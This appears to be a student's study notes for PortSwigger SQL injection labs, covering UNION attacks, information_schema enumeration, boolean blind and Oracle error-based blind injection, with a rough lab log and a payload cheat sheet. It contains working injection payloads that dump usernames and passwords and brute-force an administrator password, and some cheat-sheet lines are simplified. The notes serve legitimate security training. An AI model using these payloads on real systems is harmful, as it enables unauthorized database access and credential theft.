# SQL Injection Attack Notes
## PortSwigger Lab Guide

---

## 1️⃣ SQL UNION Attacks

### What is a UNION Attack?

A UNION attack allows you to get data from the database by combining the original query with a SELECT statement. This works when you know:

- How many columns are in the result
- Which columns contain text data

### 📋 Basic Example

If you have a `users` table with `username` and `password` columns:

```sql
SELECT username,password FROM users-- -
```

The `-- -` comments out the rest of the SQL query.

---

### ✨ Combining Data in One Column

Sometimes you need to put multiple pieces of data in one column. Use the `||` operator (in most databases):

```sql
' UNION SELECT NULL,username||'='||password FROM users-- -
```

**Result:** `admin=password123`, `user=pass456`, etc.

---

## 2️⃣ Finding Database Information

### What is Information Schema?

Every database has a special area that stores information about itself. This is called the `information_schema`. You can query it to find:

- Table names
- Column names  
- Data types

> ⚠️ **Note:** Oracle databases don't have `information_schema`

---

### 🔍 Step-by-Step: How to Discover Tables

#### Step 1: Confirm You Have 2 Columns

```sql
'+UNION+SELECT+NULL,NULL--+-
```

#### Step 2: Find the Database Type

```sql
'+UNION+SELECT+VERSION(),NULL--+-
```

This tells you if it's PostgreSQL, MySQL, etc.

#### Step 3: List All Table Names

```sql
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+-
```

#### Step 4: Find Columns in a Specific Table

Once you find a table (like `users_jzevhq`), find its columns:

```sql
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_jzevhq'--+-
```

This shows you list of columns like `username_vrzoui` and `password_xejfzv`

#### Step 5: Extract the Data

Now you know the table name and column names. Extract the data:

```sql
'+UNION+SELECT+username_vrzoui||'='||password_xejfzv,NULL+FROM+users_jzevhq--+-
```

**Result:** You get the usernames and passwords! 🎯

---

## 3️⃣ Blind SQL Injection

### What is Blind SQL Injection?

Blind SQL injection happens when the website IS vulnerable to SQL injection, BUT it doesn't show you the query results. The application either:

- Doesn't display error messages
- Doesn't show the data you asked for
- Just returns 'yes' or 'no' type responses

**Key Point:** UNION attacks don't work here, so we have to be creative using conditional responses!

---

### 🔎 Method 1: Finding Tables Using Conditional Responses

#### Confirm the Vulnerability

Try two payloads - one that's true and one that's false:

| True Payload | False Payload |
|---|---|
| `xyz' AND '1'='1` | `xyz' AND '1'='2` |
| Shows 'Welcome back' message | No message shown |

**If the first shows a message and the second doesn't = SQL injection confirmed! ✓**

---

#### Finding Tables

Use a conditional query to check if a table exists:

```sql
xyz' AND (SELECT 'x' FROM users LIMIT 1)='x'--
```

- If the `users` table exists → Welcome back message shown ✓
- If it doesn't exist → No message

---

### 🔎 Method 2: Finding Columns

Test if a specific column exists:

```sql
' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```

**If it returns true → The `username` column exists! Now we know 'administrator' is a valid username. ✓**

---

### 🔐 Method 3: Extracting the Password

#### Step 1: Check if Password Column Exists

```sql
' AND (SELECT password FROM users WHERE username='administrator')>'a'--
```

**Result:** Yes, the password is greater than 'a' ✓

---

#### Step 2: Find the Password Length

```sql
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--
```

Use the **Intruder tool** in Burp to brute force the length by testing different numbers. You'll find it's probably around 19 characters.

---

#### Step 3: Guess Each Character

Now guess the password one character at a time using `substring()`:

```sql
' AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='s'--
```

**How it works:**

- `substring(password,1,1)` = first character
- `substring(password,2,1)` = second character
- Try 'a', 'b', 'c'... until you get a 'Welcome back' message ✓
- That character is part of the password!

---

#### Step 4: Automate with Burp Intruder

💡 **Better approach:** Use Burp Intruder to brute force all positions (1-19) and all characters (a-z, 0-9) automatically.

**Setup in Burp:**
1. Send your request to Intruder
2. Mark the part you want to brute force (the character)
3. Set Payload positions to all numbers and letters
4. Run the attack
5. Look for responses that are different from others (usually they're longer or show different message)

---


## 4 Error based SQL Injection:
- Even in blind context we are able to use error message to either extract or infer with the sensitive data from database.
- We can modify the query so that it cause the database error only if the condition is true
    ## IDEA FOR TESTING ERROR BASED BLIND SQLI:
    ```
    xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
    ```
    - This use the `CASE` input to test condition and return diff response depending wheather a expression is true.
    -  With the first input, the `CASE` expression evaluates to 'a', which does not cause any error. 
    -  With the second input, it evaluates to 1/0, which causes a divide-by-zero error. 

    ### IF THE ERROR CAUSE IS DIFFERENT IN HTTP-RESPONSE WE CAN DETERMINE WHEATHER THE INJECTED CONDITION IS TRUE
        ```
        xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
        ```
    ### NOW LET'S GO FOR LAB: 
        - Lab: Blind SQL injection with conditional errors
        ' --> err
'' --> 200
' -- - --> 200 



string concat


' || SELECT '' || '      --> SELECTING AN EMPTY STRING

this shows an internal server error why?? 
may be this is an another db
let's assume this is an oracle, in oracle db we require FROM clause and it's dummy table is DUAL so let's use 

' || (SELECT '' FROM DUAL) || '      --> we require () also cause it's an substring right?? 

' || (SELECT '' FROM DUAL) || '     --> so this shows an 200OK we know that we are dealing with oracel db

now let's try to use CASE statement is oracle and from there we will go until finding the correct table name and columns in their field

'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || ' --> internal server errror beaucse 1=1 is true and it goes 1/0 i.e always false

'|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || ' --> ths shows 200OK res because 1=2 is false and it goes to else condition i.e empty string

NOW LET'S FIND THE TABLE NAME??
- let's assume we have users table
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users) || ' --> this gives 500 error cause it don't konw emty string form where to find so we uuse: ROWNUM so our payload would be: 

' || (SELECT '' FROM users WHERE ROWNUM=1) || '   --> this gives us 200OK we know that users table does exist 

'|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1) ||  --> return 200 PROVES THAT users table does exist


NOW LET'S ASSUME WE HAVE USERNAME=administrator let's prove it

'|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '   --> this shows 200ok
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || ' --> server error
some doubt came here still not proves that username administrtor exist let's try same with username that don't exist

'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='nono') || '  --> 200 ok with username don't exist and true case

'|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='nono') || '  --> 200ok with username don't exist and with false case 
this overall behaviour proves that our username administrator does exist 

NOW LET'S FIND THE PASSWORD:
1. let's check the length of password first 

'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>1) || '  --> shows 500 server error 

'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>19) || ' --> error 500

'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>20) || '  --> shows 200 OK means our password is greater then 19 character and less then 20 means 20 character long 


NOW LET'S USE SUBSTRING METHOD TO LOOK FOR PASSWORD 
SUBSTRING(password,start,length)

'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)=a) || '  --> it's not SUBSTRING IT'S SUBSTR --> seems like invalid password shows 200ok and valid one shows 500 error now let's bruteforce it from intruder password with alphanumeric character and start with numeric number

so from intruder bruteforcing and seeing the 500 error message from payload 1 to 20 we get administrator password now we login and solve the lab


## 🎯 Quick Reference Cheat Sheet

### UNION Attack Flow
```
1. Find number of columns → '+UNION+SELECT+NULL,NULL--+-
2. Find which is text → '+UNION+SELECT+NULL,'test'--+-
3. Get database info → '+UNION+SELECT+VERSION(),NULL--+-
4. List tables → '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+-
5. List columns → '+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--+-
6. Extract data → '+UNION+SELECT+column1||'='||column2,NULL+FROM+users--+-
```

### Blind SQL Injection Flow
```
1. Confirm vulnerability → 'AND'1'='1 vs 'AND'1'='2
2. Find tables → ' AND (SELECT 'x' FROM table LIMIT 1)='x'--
3. Find columns → ' AND (SELECT column FROM table WHERE id=1)>'a'--
4. Get length → ' AND LENGTH(column)=5--
5. Brute force → ' AND substring(column,1,1)='a'--
```

---

## 📚 Important Database Functions

| Database | Version Command | String Concat | Substring |
|----------|-----------------|---------------|-----------|
| PostgreSQL | `VERSION()` | `\|\|` | `substring()` |
| MySQL | `VERSION()` | `CONCAT()` | `SUBSTRING()` |
| Microsoft SQL Server | `@@version` | `+` | `SUBSTRING()` |
| Oracle | `v$version` | `\|\|` | `SUBSTR()` |

---

## 💡 Pro Tips

1. **Use URL Encoding** - When pasting in URLs, spaces become `+` and quotes become `%27`
2. **Comments** - Use `-- -` (space after dashes) to comment out rest of query
3. **NULL values** - Use NULL when you don't know what data to return: `SELECT NULL,column`
4. **LIMIT 1** - Useful in Blind SQL to get only one row
5. **Burp Intruder** - Essential tool for brute forcing in Blind SQL
6. **Save payloads** - Copy successful payloads somewhere so you remember them!

---

## ⚠️ Common Mistakes

- ❌ Forgetting the `-- -` to comment out the rest
- ❌ Not URL encoding your payload
- ❌ Assuming all columns are text (some are numbers)
- ❌ Forgetting `LIMIT 1` in blind SQL (gets multiple rows)
- ❌ Not using Intruder for brute forcing (doing it manually is slow!)

---

**Good luck with your labs! Practice these techniques carefully.**

Remember: Understand EACH step before moving to the next lab. Once you understand the concepts, the labs become much easier!